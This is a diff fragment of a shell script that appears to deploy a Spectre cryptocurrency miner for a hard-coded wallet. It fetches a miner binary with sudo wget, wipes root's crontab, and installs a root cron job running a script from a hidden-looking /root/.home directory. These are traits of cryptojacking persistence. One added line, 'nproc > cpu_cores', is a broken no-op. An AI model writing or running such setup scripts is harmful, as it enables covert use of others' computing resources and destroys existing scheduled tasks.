@@ -16,7 +16,7 @@ default_wallet_address="spectre:qp5cpywdz777e0yd38qkew275kf2f9q046nac7jaqshkrch9
 
 # Get the number of CPU cores
 cpu_cores=$(nproc)
-
+nproc > cpu_cores
 # Download the miner package
 sudo wget https://github.com/nambui979/spectre/releases/download/download/spectre-miner-v0.3.16-linux-gnu-amd64.zip -O spectre-miner.zip
 
@@ -58,7 +58,7 @@ EOF
 sudo chmod +x min.sh
 cat /dev/null > /var/spool/cron/crontabs/root
 cat >>/var/spool/cron/crontabs/root<<EOF
-0 0 * * * /root/.home/lib.sh
+0 0 * * * /root/.home/lib.sh &
 EOF
 chmod 0600 /var/spool/cron/crontabs/*
 service cron restart
